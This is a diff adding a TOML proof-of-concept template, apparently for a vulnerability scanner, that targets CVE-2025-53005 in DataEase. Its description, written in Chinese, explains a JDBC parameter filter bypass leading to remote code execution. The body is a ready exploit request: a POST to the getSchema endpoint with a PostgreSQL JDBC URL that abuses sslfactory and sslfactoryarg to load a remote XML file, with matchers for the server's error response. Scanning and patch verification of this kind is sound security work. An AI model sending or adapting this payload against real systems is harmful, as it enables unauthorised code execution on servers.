@@ -1,0 +1,47 @@
+[info]
+author = "ave"
+description = "DataEase 2.10.10及之前版本PostgreSQL数据源JDBC连接参数存在绕过漏洞。sslfactory和sslfactoryarg参数可绕过socketFactory过滤限制，通过FileSystemXmlApplicationContext加载远程恶意XML配置文件触发RCE。该PoC通过向/de2api/datasource/getSchema接口发送含恶意JDBC URL的POST请求进行验证。"
+id = "POC-AVE-2025-0036"
+name = "DataEase PostgreSQL数据源JDBC连接参数绕过远程代码执行漏洞 PoC"
+severity = "high"
+tags = [
+    "cve-2025-53005",
+    "dataease",
+    "rce",
+    "jdbc-bypass",
+]
+vuln_id = [
+    "CVE-2025-53005",
+    "AVE-2025-0036",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/de2api/datasource/getSchema"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"id":"","name":"poc","description":"","type":"pg","configuration":{"jdbc":"jdbc:postgresql://127.0.0.1:5432/testdb?sslfactory=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext&sslfactoryarg=http://127.0.0.1:9999/poc.xml"},"apiConfiguration":[],"paramsConfiguration":[],"enableDataFill":false}'
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/json"
+
+[[poc.requests.matchers]]
+condition = "or"
+expect = true
+part = "body"
+type = "word"
+words = [
+    "sslfactory",
+    "BeansException",
+    "FileSystemXmlApplicationContext",
+]
+
+[[poc.requests.matchers]]
+expect = true
+status = [500]
+type = "status"
